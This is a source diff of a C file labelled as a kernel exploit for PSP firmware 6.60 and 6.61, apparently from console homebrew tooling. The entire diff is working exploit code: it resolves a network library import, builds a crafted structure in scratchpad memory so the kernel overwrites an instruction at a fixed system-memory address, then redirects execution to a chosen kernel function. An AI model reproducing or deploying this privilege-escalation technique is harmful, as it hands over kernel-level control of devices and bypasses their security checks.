@@ -32,7 +32,14 @@
 #include "functions.h"
 #include "kxploit.h"
 
+/*
+Kernel Exploit for PSP 6.60 and 6.61
+*/
+
 #define SYSMEM_TEXT_ADDR 0x88000000
+#define PATCH_OFFSET 0x0000CBB8
+#define PATCH_ADDR SYSMEM_TEXT_ADDR+PATCH_OFFSET // exact address of patch
+#define PATCHED_INST 0x3C058801 // the original instruction
 
 struct MPulldownExploit;
 int (* _sceNetMPulldown)(struct MPulldownExploit *data, int unk1, int unk2, int unk3);
@@ -45,34 +52,26 @@ struct MPulldownExploit {
 	u32 unk_data[80]; // embeeded it
 };
 
-int stubScanner(){
-	return 0;
+int stubScanner(FunctionTable* tbl){
+    for (int i=0; i<7; i++) g_tbl->UtilityLoadModule(0x100+i);
+	_sceNetMPulldown = g_tbl->FindImportUserRam("sceNetIfhandle_lib", 0xE80F00A4);
+	return (_sceNetMPulldown==NULL);
 }
 
 void repairInstruction(void){
-    //_sw(0x0040F809, 0x8800CB64);
-    _sw(0x3C058801, 0x88000000+0x0000CBB8);
+    //_sw(PATCHED_INST, PATCH_ADDR);
 }
 
 int doExploit(void){
-    return 0;
-}
-
-void executeKernel(u32 kfuncaddr){
-	struct MPulldownExploit *ptr;
+    struct MPulldownExploit *ptr;
 	int ret;
-	u32 kernel_entry, entry_addr;
 	u32 interrupts;
 
-	for (int i=0; i<7; i++) g_tbl->UtilityLoadModule(0x100+i);
-	
-	_sceNetMPulldown = g_tbl->FindImportUserRam("sceNetIfhandle_lib", 0xE80F00A4);
-	
 	ptr = (void*)0x00010000; // use scratchpad memory to bypass check at @sceNet_Service@+0x00002D80
 	memset(ptr, 0, sizeof(*ptr));
 	ptr->data = ptr->unk_data;
 	ptr->target_size = 1;
-	ptr->target = (void*)(SYSMEM_TEXT_ADDR + 0x0000CBB8 - ptr->target_size);
+	ptr->target = (void*)(PATCH_ADDR - ptr->target_size);
 
 	ptr->data[2] = (u32)(ptr->data);
 	ptr->data[3] = 4;
@@ -83,12 +82,15 @@ void executeKernel(u32 kfuncaddr){
 	
 	g_tbl->KernelIcacheInvalidateAll();
 	g_tbl->KernelDcacheWritebackAll();
-	//interrupts = g_tbl->KernelCpuSuspendIntr();
+	
+	for (int i=6; i>=0; i--) g_tbl->UtilityUnloadModule(0x100+i);
+    return 0;
+}
+
+void executeKernel(u32 kfuncaddr){
+    u32 kernel_entry, entry_addr;
 	kernel_entry = kfuncaddr;
 	entry_addr = ((u32) &kernel_entry) - 16;
 	g_tbl->KernelPowerLock(0, ((u32) &entry_addr) - 0x000040F8);
-	//g_tbl->KernelCpuResumeIntr(interrupts);
-
-	for (int i=0; i<7; i++) g_tbl->UtilityUnloadModule(0x100+i);
 }
 
